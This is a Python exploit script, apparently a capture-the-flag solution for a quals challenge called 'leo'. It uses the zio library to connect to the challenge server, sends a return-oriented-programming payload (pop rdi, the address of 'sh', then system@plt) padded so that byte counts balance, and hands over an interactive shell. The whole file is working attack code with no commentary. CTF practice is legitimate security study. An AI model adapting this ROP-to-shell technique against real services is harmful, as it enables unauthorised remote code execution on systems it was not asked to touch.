from threading import Thread
# from uploadflag import *
from zio import *

target = ('119.254.101.197', 10000)
target = './leo'
target = ('leo_33e299c29ed3f0113f3955a4c6b08500.quals.shallweplayaga.me',61111)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)


def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    io.gdb_hint()
    io.read_until('Bucko')

    count_dict = {}
    for i in range(0xd1):
        count = 16000/0xd1
        if i < 16000%0xd1:
            count += 1
        count_dict[i] = count

    system_plt = 0x0000000000400FD0
    pop_rdi_ret = 0x0000000000402703
    sh = 0x4008ca

    payload = l32(8001)+l32(0x20) + 'a'*8
    payload += l64(pop_rdi_ret)+l64(sh)+l64(system_plt)

    for c in payload:
        count_dict[ord(c)] -= 1

    d = ''
    for i in range(0xd1):
        d += chr(i)*count_dict[i]

    d = d[0:0x18]+payload+d[0x18:]

    io.gdb_hint()
    io.writeline(d)
    interact(io)

exp(target)
